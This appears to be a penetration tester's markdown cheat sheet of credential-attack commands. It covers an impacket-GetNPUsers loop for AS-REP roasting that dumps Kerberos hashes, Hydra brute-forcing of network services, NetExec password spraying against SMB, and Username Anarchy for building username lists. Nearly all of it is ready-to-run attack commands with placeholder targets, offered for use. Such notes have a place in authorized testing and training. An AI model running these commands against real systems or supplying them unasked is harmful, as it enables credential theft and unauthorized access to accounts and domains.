# ASREPRoasting

Extract hashes from user accounts that do not require pre-authentication
```
unames.txt can be generated with a tool like Username Anarchy, etc.

while read u; do impacket-GetNPUsers fqdn/"$u" -request -no-pass -dc-ip ipaddress >> hashes.txt; done < unames.txt
```

# Hydra

Brute Force Service
`hydra -l username -P passwordlist ipaddress servicename`

File user:pass Format
`hydra -C userpass.txt ipaddress servicename`

# NetExec

Password spray one pass (e.g., default new user pass)
`nxc smb ipaddress -u userlist.txt -p 'password' --continue-on-success`

Password spray username = password cred combinations
`nxc smb ipaddress -u users.txt -p users.txt --no-bruteforce --continue-on-success`

# Username Anarchy

Generate Usernames From Full Names
`./username-anarchy --input-file ../fullnames.txt --select-format first,flast,first.last,firstl > ../unames.txt`
